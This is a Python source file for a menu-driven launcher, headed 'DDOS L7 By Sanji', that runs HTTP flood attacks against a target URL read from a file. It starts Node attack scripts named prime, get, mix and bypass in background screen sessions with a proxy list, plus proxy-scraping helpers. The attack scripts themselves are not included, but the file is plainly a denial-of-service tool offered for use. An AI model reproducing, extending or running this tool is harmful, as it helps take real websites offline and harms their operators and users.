import os
import sys
import subprocess

def show_menu():
    print("DDOS L7 By Sanji")
    print("")
    print("Select a method:")
    print("s) ScrapeHTTP")
    print("0) Scrape")
    print("1) PRIME")
    print("2) GET")
    print("3) MIX")
    print("4) BYPASS")
    print("5) CHANGE URL")
    print("6) KILL SCREEN PROCESSES")
    print("7) EXIT")
    choice = input("Enter your choice: ")
    return choice

def get_url():
    url_path = os.path.join('url.txt')
    if os.path.isfile(url_path):
        with open(url_path, 'r') as file:
            url = file.read().strip()
        return url
    else:
        print("url.txt not found!")
        sys.exit(1)

def change_url():
    new_url = input("Enter the new URL: ")
    url_path = os.path.join('url.txt')
    with open(url_path, 'w') as file:
        file.write(new_url)
    print("URL updated successfully!")
    input("Press any key to return to the menu...")

def kill_screen_processes():
    subprocess.run(["pkill", "screen"])
    print("All screen processes killed.")

def run_command(command, background=False):
    print(f"Running: {command}")
    if background:
        subprocess.run(["screen", "-d", "-m", "bash", "-c", command])
    else:
        subprocess.run(command, shell=True)

def main():
    while True:
        choice = show_menu()
        if choice == '0':
            run_command("node scrape.js")
        elif choice == 's':
            run_command("python3 scrape.py")
        elif choice in ['1', '2', '3', '4']:
            url = get_url()
            methods = {
                '1': 'prime.js',
                '2': 'get.js',
                '3': 'mix.js',
                '4': 'bypass.js'
            }
            method = methods[choice]
            command = f"node {method} {url} 5000 256 5 proxy.txt"
            if method != 'scrape.js':  # Don't run scrape.js in background
                run_command(command, background=True)
            else:
                run_command(command)
        elif choice == '5':
            change_url()
        elif choice == '6':
            kill_screen_processes()
        elif choice == '7':
            print("Exiting...")
            break
        else:
            print("Invalid choice, please try again.")

if __name__ == "__main__":
    main()
